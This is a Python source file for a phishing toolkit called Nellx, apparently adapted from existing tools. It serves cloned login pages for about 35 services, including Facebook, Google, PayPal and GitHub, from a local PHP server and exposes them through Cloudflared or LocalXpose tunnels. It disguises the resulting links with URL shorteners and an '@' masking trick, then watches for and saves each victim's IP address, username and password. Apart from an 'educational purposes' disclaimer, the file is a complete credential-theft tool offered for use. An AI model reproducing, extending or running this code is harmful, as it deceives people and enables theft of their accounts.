#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import re
import shutil
import signal
import subprocess
import platform
import urllib.request
import urllib.error
import json
import tarfile
import zipfile
from pathlib import Path
from typing import Optional

## DEFAULT HOST & PORT
HOST: str = '127.0.0.1'
PORT: str = '8080'

## ANSI colours (original scheme)
RED = "\033[31m"
GREEN = "\033[32m"
ORANGE = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
BLACK = "\033[30m"
REDBG = "\033[41m"
GREENBG = "\033[42m"
ORANGEBG = "\033[43m"
BLUEBG = "\033[44m"
MAGENTABG = "\033[45m"
CYANBG = "\033[46m"
WHITEBG = "\033[47m"
BLACKBG = "\033[40m"
RESETBG = "\033[0m\n"

BOLD = "\033[1m"
RESET = "\033[0m"

## Directories
BASE_DIR = Path(__file__).resolve().parent

def ensure_dirs() -> None:
    (BASE_DIR / ".server").mkdir(exist_ok=True)
    (BASE_DIR / "auth").mkdir(exist_ok=True)
    www = BASE_DIR / ".server" / "www"
    if www.exists():
        shutil.rmtree(www)
    www.mkdir(parents=True, exist_ok=True)
    for logf in [".server/.loclx", ".server/.cld.log"]:
        p = BASE_DIR / logf
        if p.exists():
            p.unlink()

ensure_dirs()

def reset_color() -> None:
    sys.stdout.write(RESET)
    sys.stdout.flush()

def exit_on_signal_SIGINT(signum, frame) -> None:
    print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Program Interrupted.")
    reset_color()
    sys.exit(0)

def exit_on_signal_SIGTERM(signum, frame) -> None:
    print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Program Terminated.")
    reset_color()
    sys.exit(0)

signal.signal(signal.SIGINT, exit_on_signal_SIGINT)
signal.signal(signal.SIGTERM, exit_on_signal_SIGTERM)

def kill_pid() -> None:
    for process in ["php", "cloudflared", "loclx"]:
        try:
            subprocess.run(["killall", process], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

# ────────────────────────── Banners (original colours) ─────────────────────
def show() -> None:
    print(f"{GREEN}{BOLD}")
    print("  ███╗   ██╗███████╗██╗      ██╗      ██╗  ██╗")
    print("  ████╗  ██║██╔════╝██║      ██║      ╚██╗██╔╝")
    print("  ██╔██╗ ██║█████╗  ██║      ██║       ╚███╔╝ ")
    print("  ██║╚██╗██║██╔══╝  ██║      ██║       ██╔██╗ ")
    print("  ██║ ╚████║███████╗███████╗ ███████╗ ██╔╝ ██╗")
    print("  ╚═╝  ╚═══╝╚══════╝╚══════╝ ╚══════╝ ╚═╝  ╚═╝")
    print(RESET)

    print(f"{GREEN}{BOLD}")
    print("        \\_______/          ")
    print("    `.  /       \\ .'       ")
    print("      `-| () () |-'        ")
    print("       /  /\\_/\\  \\         ")
    print("      /  /  |  \\  \\        ")
    print("     ( >/   |   \\< )       ")
    print(f"      >{ORANGE}=={RED}>>{ORANGE}>>{RED}>>{ORANGE}>>{RED}>>>>{ORANGE}~{RED}~~{ORANGE}~~~~~{RESET}")
    print(f"{GREEN}{BOLD}     ( >/   |   \\< )       ")
    print("      \\  \\ _|_ /  /        ")
    print("       \\__|   |__/         ")
    print("       /  |   |  \\         ")
    print("      /   |   |   \\        ")
    print("    _/    |   |    \\_      ")
    print("   / \\____|   |____/ \\     ")
    print("  /       \\___|      \\     ")
    print(RESET)

    print(f"{ORANGE}{BOLD}")
    print("          Developed by: zaazouamouad")
    print(RESET)

def banner_small() -> None:
    print(f"""
{BLUE}  ███╗   ██╗███████╗██╗      ██╗      ██╗  ██╗
{BLUE}  ████╗  ██║██╔════╝██║      ██║      ╚██╗██╔╝
{BLUE}  ██╔██╗ ██║█████╗  ██║      ██║       ╚███╔╝
{BLUE}  ██║╚██╗██║██╔══╝  ██║      ██║       ██╔██╗
{BLUE}  ██║ ╚████║███████╗███████╗ ███████╗ ██╔╝ ██╗
{BLUE}  ╚═╝  ╚═══╝╚══════╝╚══════╝ ╚══════╝ ╚═╝  ╚═╝{WHITE}
    """)

# ────────────────── Internet & Dependencies ─────────────────────
def check_status() -> None:
    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Internet Status : ", end="")
    try:
        urllib.request.urlopen("https://api.github.com", timeout=3)
        print(f"{GREEN}Online{WHITE}")
    except Exception:
        print(f"{RED}Offline{WHITE}")

def dependencies() -> None:
    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing required packages...")
    termux_home = "/data/data/com.termux/files/home"
    if os.path.isdir(termux_home):
        if not shutil.which("proot"):
            print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing package : {ORANGE}proot{CYAN}")
            subprocess.run(["pkg", "install", "proot", "resolv-conf", "-y"], check=False)
        if not shutil.which("tput"):
            print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing package : {ORANGE}ncurses-utils{CYAN}")
            subprocess.run(["pkg", "install", "ncurses-utils", "-y"], check=False)

    required = ["php", "curl", "unzip"]
    missing = [p for p in required if not shutil.which(p)]
    if not missing:
        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} Packages already installed.")
        return

    for pkg in missing:
        print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing package : {ORANGE}{pkg}{CYAN}")
        if shutil.which("pkg"):
            subprocess.run(["pkg", "install", pkg, "-y"], check=False)
        elif shutil.which("apt"):
            subprocess.run(["sudo", "apt", "install", pkg, "-y"], check=False)
        elif shutil.which("apt-get"):
            subprocess.run(["sudo", "apt-get", "install", pkg, "-y"], check=False)
        elif shutil.which("pacman"):
            subprocess.run(["sudo", "pacman", "-S", pkg, "--noconfirm"], check=False)
        elif shutil.which("dnf"):
            subprocess.run(["sudo", "dnf", "-y", "install", pkg], check=False)
        elif shutil.which("yum"):
            subprocess.run(["sudo", "yum", "-y", "install", pkg], check=False)
        else:
            print(f"\n{RED}[{WHITE}!{RED}]{RED} Unsupported package manager, install packages manually.")
            reset_color()
            sys.exit(1)

# ────────────────── binary download (safe, non‑fatal) ─────────
def download(url: str, output: str) -> bool:
    file_name = os.path.basename(url)
    dest_file = BASE_DIR / file_name
    dest_output = BASE_DIR / ".server" / output
    if dest_file.exists():
        dest_file.unlink()
    if dest_output.exists():
        dest_output.unlink()
    try:
        urllib.request.urlretrieve(url, dest_file)
    except Exception:
        return False
    try:
        if dest_file.suffix == ".zip":
            with zipfile.ZipFile(dest_file, 'r') as zf:
                zf.extractall(BASE_DIR / ".server")
            extracted = BASE_DIR / ".server" / output
            if not extracted.exists():
                for f in zf.namelist():
                    if f == output or f.endswith("/" + output):
                        extracted = BASE_DIR / ".server" / f
                        break
            if extracted != dest_output:
                shutil.move(str(extracted), str(dest_output))
        elif dest_file.suffix == ".tgz":
            with tarfile.open(dest_file) as tar:
                tar.extractall(BASE_DIR / ".server")
            extracted = BASE_DIR / ".server" / output
            if not extracted.exists():
                for member in tar.getmembers():
                    if member.name.endswith(output):
                        extracted = BASE_DIR / ".server" / member.name
                        break
            if extracted != dest_output:
                shutil.move(str(extracted), str(dest_output))
        else:
            shutil.move(str(dest_file), str(dest_output))
        dest_output.chmod(0o755)
    except Exception:
        return False
    finally:
        if dest_file.exists():
            dest_file.unlink()
    return True

def install_cloudflared() -> None:
    target = BASE_DIR / ".server" / "cloudflared"
    if target.exists():
        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} Cloudflared already installed.")
        return
    system_cf = shutil.which("cloudflared")
    if system_cf:
        shutil.copy2(system_cf, target)
        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} Cloudflared found on system, copied.")
        return
    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing Cloudflared...{WHITE}")
    arch = platform.machine()
    url_map = {
        'arm': 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm',
        'aarch64': 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64',
        'x86_64': 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64',
    }
    url = url_map.get(arch, 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386')
    if not download(url, 'cloudflared'):
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Failed to download cloudflared. Install it manually.")
        sys.exit(1)

def install_localxpose() -> None:
    target = BASE_DIR / ".server" / "loclx"
    if target.exists():
        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} LocalXpose already installed.")
        return
    system_loclx = shutil.which("loclx")
    if system_loclx:
        shutil.copy2(system_loclx, target)
        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} LocalXpose found on system, copied.")
        return
    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing LocalXpose...{WHITE}")
    arch = platform.machine()
    url_map = {
        'arm': 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip',
        'aarch64': 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip',
        'x86_64': 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip',
    }
    url = url_map.get(arch, 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip')
    if not download(url, 'loclx'):
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Failed to download LocalXpose.")
        print(f"{ORANGE}Please install it manually and place it in {target} or in your PATH.{WHITE}")
        sys.exit(1)

# ────────────────── Exit / About / ... ──────────────────────
def msg_exit() -> None:
    print("\033c", end="")
    show()
    print(f"{GREENBG}{BLACK} Thank you for using Nellx. Have a good day.{RESETBG}")
    reset_color()
    sys.exit(0)

def about() -> None:
    print("\033c", end="")
    show()
    print(f"""
{GREEN} Author   {RED}:  {ORANGE}zaazouamouad
{GREEN} Github   {RED}:  {CYAN}https://github.com/zaazouamouad/nellx

{WHITE} {REDBG}Warning:{RESETBG}
{CYAN}  This Tool is made for educational purposes 
  only {RED}!{WHITE}{CYAN} Author will not be responsible for 
  any misuse of this toolkit {RED}!{WHITE}

{RED}[{WHITE}00{RED}]{ORANGE} Main Menu     {RED}[{WHITE}99{RED}]{ORANGE} Exit
""")
    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
    if choice in ["99"]:
        msg_exit()
    elif choice in ["0", "00"]:
        print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Returning to main menu...")
        time.sleep(1)
        main_menu()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        about()

def cusport() -> None:
    global PORT
    print()
    ans = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Do You Want A Custom Port {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]: {ORANGE}").strip().lower()
    if ans == 'y':
        print()
        cu_p = input(f"{RED}[{WHITE}-{RED}]{ORANGE} Enter Your Custom 4-digit Port [1024-9999] : {WHITE}").strip()
        if cu_p and re.match(r'^[1-9]\d{3}$', cu_p) and 1024 <= int(cu_p) <= 9999:
            PORT = cu_p
            print()
        else:
            print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid 4-digit Port : {cu_p}, Try Again...{WHITE}")
            time.sleep(2)
            print("\033c", end="")
            banner_small()
            cusport()
    else:
        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Using Default Port {PORT}...{WHITE}\n")

php_process = None

def setup_site(website: str) -> None:
    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Setting up server...{WHITE}")
    src = BASE_DIR / ".sites" / website
    dst = BASE_DIR / ".server" / "www"
    if src.exists():
        for item in src.iterdir():
            if item.is_dir():
                shutil.copytree(item, dst / item.name, dirs_exist_ok=True)
            else:
                shutil.copy2(item, dst / item.name)
    ip_php = BASE_DIR / ".sites" / "ip.php"
    if ip_php.exists():
        shutil.copy2(ip_php, dst / "ip.php")
    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Starting PHP server...{WHITE}")
    global php_process
    php_process = subprocess.Popen(
        ["php", "-S", f"{HOST}:{PORT}"],
        cwd=dst,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

# ────────────────── Data Capture ────────────────────────────
def capture_ip() -> None:
    ip_file = BASE_DIR / ".server" / "www" / "ip.txt"
    if ip_file.exists():
        content = ip_file.read_text()
        ip_match = re.search(r'IP: (.*)', content)
        if ip_match:
            ip = ip_match.group(1).strip()
            print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Victim's IP : {BLUE}{ip}")
            auth_ip = BASE_DIR / "auth" / "ip.txt"
            with open(auth_ip, 'a') as authf:
                authf.write(content)
            print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}auth/ip.txt")
        ip_file.unlink()

def capture_creds() -> None:
    user_file = BASE_DIR / ".server" / "www" / "usernames.txt"
    if user_file.exists():
        content = user_file.read_text()
        account_match = re.search(r'Username: (.*)', content)
        pass_match = re.search(r'Pass: (.*)', content)
        if account_match:
            account = account_match.group(1).strip()
            print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Account : {BLUE}{account}")
        if pass_match:
            password = pass_match.group(1).strip()
            print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Password : {BLUE}{password}")
        (BASE_DIR / "auth" / "usernames.dat").open('a').write(content)
        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}auth/usernames.dat")
        user_file.unlink()
        print(f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Next Login Info, {BLUE}Ctrl + C {ORANGE}to exit. ")

def capture_data() -> None:
    print(f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Login Info, {BLUE}Ctrl + C {ORANGE}to exit...")
    while True:
        if (BASE_DIR / ".server" / "www" / "ip.txt").exists():
            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Victim IP Found !")
            capture_ip()
        time.sleep(0.75)
        if (BASE_DIR / ".server" / "www" / "usernames.txt").exists():
            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Login info Found !!")
            capture_creds()
        time.sleep(0.75)

# ────────────────── Tunnelling ──────────────────────────────
def start_cloudflared() -> None:
    cld_log = BASE_DIR / ".server" / ".cld.log"
    if cld_log.exists():
        cld_log.unlink()
    cusport()
    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
    time.sleep(1)
    setup_site(current_website)
    print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Launching Cloudflared...")
    if shutil.which("termux-chroot"):
        cmd = ["termux-chroot", str(BASE_DIR / ".server" / "cloudflared"), "tunnel", "-url", f"{HOST}:{PORT}", "--logfile", str(cld_log)]
    else:
        cmd = [str(BASE_DIR / ".server" / "cloudflared"), "tunnel", "-url", f"{HOST}:{PORT}", "--logfile", str(cld_log)]
    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(8)
    try:
        log = cld_log.read_text()
        url_match = re.search(r'https://[-0-9a-z]*\.trycloudflare\.com', log)
        if url_match:
            cldflr_url = url_match.group(0)
            custom_url(cldflr_url)
            capture_data()
        else:
            print("Error: Cloudflared URL not found.")
    except Exception as e:
        print(f"Error reading cloudflared log: {e}")

def localxpose_auth() -> None:
    subprocess.Popen([str(BASE_DIR / ".server" / "loclx"), "-help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    auth_f = Path.home() / ".localxpose" / ".access"
    auth_f.parent.mkdir(parents=True, exist_ok=True)
    result = subprocess.run([str(BASE_DIR / ".server" / "loclx"), "account", "status"], capture_output=True, text=True)
    if "Error" in result.stdout or "Error" in result.stderr or not auth_f.exists():
        print(f"\n{RED}[{WHITE}!{RED}]{GREEN} Create an account on {ORANGE}localxpose.io{GREEN} & copy the token\n")
        time.sleep(3)
        token = input(f"{RED}[{WHITE}-{RED}]{ORANGE} Input Loclx Token :{ORANGE} ")
        if not token.strip():
            print(f"\n{RED}[{WHITE}!{RED}]{RED} You have to input Localxpose Token.")
            time.sleep(2)
            tunnel_menu()
            return
        auth_f.write_text(token.strip())

def start_loclx() -> None:
    cusport()
    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
    time.sleep(1)
    setup_site(current_website)
    localxpose_auth()
    print()
    opinion = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Change Loclx Server Region? {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]:{ORANGE} ").strip().lower()
    loclx_region = "eu" if opinion == 'y' else "us"
    print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Launching LocalXpose...")
    if shutil.which("termux-chroot"):
        cmd = ["termux-chroot", str(BASE_DIR / ".server" / "loclx"), "tunnel", "--raw-mode", "http", "--region", loclx_region, "--https-redirect", "-t", f"{HOST}:{PORT}"]
    else:
        cmd = [str(BASE_DIR / ".server" / "loclx"), "tunnel", "--raw-mode", "http", "--region", loclx_region, "--https-redirect", "-t", f"{HOST}:{PORT}"]
    loclx_log = BASE_DIR / ".server" / ".loclx"
    if loclx_log.exists():
        loclx_log.unlink()
    with open(loclx_log, 'w') as logf:
        subprocess.Popen(cmd, stdout=logf, stderr=subprocess.STDOUT)
    time.sleep(12)
    try:
        log = loclx_log.read_text()
        url_match = re.search(r'[0-9a-zA-Z.]*\.loclx\.io', log)
        if url_match:
            loclx_url = url_match.group(0)
            custom_url(loclx_url)
            capture_data()
        else:
            print("Error: LocalXpose URL not found.")
    except Exception as e:
        print(f"Error reading localxpose log: {e}")

def start_localhost() -> None:
    cusport()
    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
    setup_site(current_website)
    time.sleep(1)
    print("\033c", end="")
    banner_small()
    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Successfully Hosted at : {GREEN}{CYAN}http://{HOST}:{PORT} {GREEN}")
    capture_data()

# ────────────────── URL shorten & mask ─────────────────────
def custom_mask() -> Optional[str]:
    print("\033c", end="")
    banner_small()
    print()
    ans = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Do you want to change Mask URL? {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}] :{ORANGE} ").strip().lower()
    if ans == 'y':
        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Enter your custom URL below {CYAN}({ORANGE}Example: https://get-free-followers.com{CYAN})\n")
        mask_url = input(f"{WHITE} ==> {ORANGE}").strip()
        if mask_url.startswith("http://") or mask_url.startswith("https://") or mask_url.startswith("www."):
            print(f"\n{RED}[{WHITE}-{RED}]{CYAN} Using custom Masked Url :{GREEN} {mask_url}")
            return mask_url
        else:
            print(f"\n{RED}[{WHITE}!{RED}]{ORANGE} Invalid url type..Using the Default one..")
    return None

def site_stat(url: str) -> bool:
    try:
        req = urllib.request.Request(url + "https://github.com", method='HEAD')
        resp = urllib.request.urlopen(req, timeout=5)
        return str(resp.status)[0] == '2'
    except Exception:
        return False

def shorten(shortener: str, long_url: str) -> Optional[str]:
    try:
        with urllib.request.urlopen(shortener + long_url) as resp:
            data = resp.read().decode()
        if "shrtco.de" in shortener:
            return json.loads(data)["result"]["short_link2"]
        else:
            return data.strip()
    except Exception:
        return None

def custom_url(phish_url: str) -> None:
    url = phish_url.replace("http://", "").replace("https://", "")
    isgd = "https://is.gd/create.php?format=simple&url="
    shortcode = "https://api.shrtco.de/v2/shorten?url="
    tinyurl = "https://tinyurl.com/api-create.php?url="

    mask = custom_mask()
    time.sleep(1)
    print("\033c", end="")
    banner_small()

    full_url = "https://" + url
    processed_url = None
    masked_url = None

    if re.search(r'[-a-zA-Z0-9.]*\.(trycloudflare\.com|loclx\.io)', url):
        for service in [isgd, shortcode, tinyurl]:
            if site_stat(service):
                processed = shorten(service, full_url)
                if processed:
                    processed_url = "https://" + processed
                    if mask:
                        masked_url = f"{mask}@{processed}"
                    break
        if processed_url:
            print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 1 : {GREEN}{full_url}")
            print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 2 : {ORANGE}{processed_url}")
            if masked_url:
                print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 3 : {ORANGE}{masked_url}")
        else:
            print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Unable to Short URL")
    else:
        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL : {GREEN}{full_url}")

# ────────────────── Site menus (original colours) ───────────
def tunnel_menu() -> None:
    print("\033c", end="")
    banner_small()
    print(f"""
{RED}[{WHITE}01{RED}]{ORANGE} Localhost
{RED}[{WHITE}02{RED}]{ORANGE} Cloudflared  {RED}[{CYAN}Auto Detects{RED}]
{RED}[{WHITE}03{RED}]{ORANGE} LocalXpose   {RED}[{CYAN}NEW! Max 15Min{RED}]
""")
    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select a port forwarding service : {BLUE}")
    if choice in ["1", "01"]:
        start_localhost()
    elif choice in ["2", "02"]:
        start_cloudflared()
    elif choice in ["3", "03"]:
        start_loclx()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        tunnel_menu()

def site_facebook() -> None:
    global current_website
    print("\033c", end="")
    banner_small()
    print(f"""
{RED}[{WHITE}01{RED}]{ORANGE} Traditional Login Page
{RED}[{WHITE}02{RED}]{ORANGE} Advanced Voting Poll Login Page
{RED}[{WHITE}03{RED}]{ORANGE} Fake Security Login Page
{RED}[{WHITE}04{RED}]{ORANGE} Facebook Messenger Login Page
""")
    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
    options = {
        "1": "facebook", "01": "facebook",
        "2": "fb_advanced", "02": "fb_advanced",
        "3": "fb_security", "03": "fb_security",
        "4": "fb_messenger", "04": "fb_messenger",
    }
    if choice in options:
        current_website = options[choice]
        tunnel_menu()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        site_facebook()

def site_instagram() -> None:
    global current_website
    print("\033c", end="")
    banner_small()
    print(f"""
{RED}[{WHITE}01{RED}]{ORANGE} Traditional Login Page
{RED}[{WHITE}02{RED}]{ORANGE} Auto Followers Login Page
{RED}[{WHITE}03{RED}]{ORANGE} 1000 Followers Login Page
{RED}[{WHITE}04{RED}]{ORANGE} Blue Badge Verify Login Page
""")
    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
    options = {
        "1": "instagram", "01": "instagram",
        "2": "ig_followers", "02": "ig_followers",
        "3": "insta_followers", "03": "insta_followers",
        "4": "ig_verify", "04": "ig_verify",
    }
    if choice in options:
        current_website = options[choice]
        tunnel_menu()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        site_instagram()

def site_gmail() -> None:
    global current_website
    print("\033c", end="")
    banner_small()
    print(f"""
{RED}[{WHITE}01{RED}]{ORANGE} Gmail Old Login Page
{RED}[{WHITE}02{RED}]{ORANGE} Gmail New Login Page
{RED}[{WHITE}03{RED}]{ORANGE} Advanced Voting Poll
""")
    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
    options = {
        "1": "google", "01": "google",
        "2": "google_new", "02": "google_new",
        "3": "google_poll", "03": "google_poll",
    }
    if choice in options:
        current_website = options[choice]
        tunnel_menu()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        site_gmail()

def site_vk() -> None:
    global current_website
    print("\033c", end="")
    banner_small()
    print(f"""
{RED}[{WHITE}01{RED}]{ORANGE} Traditional Login Page
{RED}[{WHITE}02{RED}]{ORANGE} Advanced Voting Poll Login Page
""")
    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
    options = {"1": "vk", "01": "vk", "2": "vk_poll", "02": "vk_poll"}
    if choice in options:
        current_website = options[choice]
        tunnel_menu()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        site_vk()

# ────────────────── MAIN MENU (only the attack list in purple) ───
current_website: Optional[str] = None

def main_menu() -> None:
    global current_website
    print("\033c", end="")
    show()
    print()
    # Use a purple color only for the attack list
    PURPLE = "\033[35m"

    print(f"""{PURPLE}{BOLD}
[01] Facebook      [11] Twitch       [21] DeviantArt
[02] Instagram     [12] Pinterest    [22] Badoo
[03] Google        [13] Snapchat     [23] Origin
[04] Microsoft     [14] Linkedin     [24] DropBox
[05] Netflix       [15] Ebay         [25] Yahoo
[06] Paypal        [16] Quora        [26] Wordpress
[07] Steam         [17] Protonmail   [27] Yandex
[08] Twitter       [18] Spotify      [28] StackoverFlow
[09] Playstation   [19] Reddit       [29] Vk
[10] Tiktok        [20] Adobe        [30] XBOX
[31] Mediafire     [32] Gitlab       [33] Github
[34] Discord       [35] Roblox
{RESET}
""")
    print(f"{RED}[{WHITE}99{RED}]{ORANGE} About         {RED}[{WHITE}00{RED}]{ORANGE} Exit")
    choice = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")

    single_sites = {
        "4": "microsoft", "04": "microsoft",
        "5": "netflix", "05": "netflix",
        "6": "paypal", "06": "paypal",
        "7": "steam", "07": "steam",
        "8": "twitter", "08": "twitter",
        "9": "playstation", "09": "playstation",
        "10": "tiktok",
        "11": "twitch", "12": "pinterest", "13": "snapchat",
        "14": "linkedin", "15": "ebay", "16": "quora",
        "17": "protonmail", "18": "spotify", "19": "reddit",
        "20": "adobe", "21": "deviantart", "22": "badoo",
        "23": "origin", "24": "dropbox", "25": "yahoo",
        "26": "wordpress", "27": "yandex", "28": "stackoverflow",
        "30": "xbox", "31": "mediafire", "32": "gitlab",
        "33": "github", "34": "discord", "35": "roblox",
    }

    submenus = {
        "1": site_facebook, "01": site_facebook,
        "2": site_instagram, "02": site_instagram,
        "3": site_gmail, "03": site_gmail,
        "29": site_vk,
    }

    if choice in submenus:
        submenus[choice]()
    elif choice in single_sites:
        current_website = single_sites[choice]
        tunnel_menu()
    elif choice == "99":
        about()
    elif choice in ["0", "00"]:
        msg_exit()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        main_menu()

if __name__ == "__main__":
    kill_pid()
    dependencies()
    check_status()
    install_cloudflared()
    install_localxpose()
    main_menu()
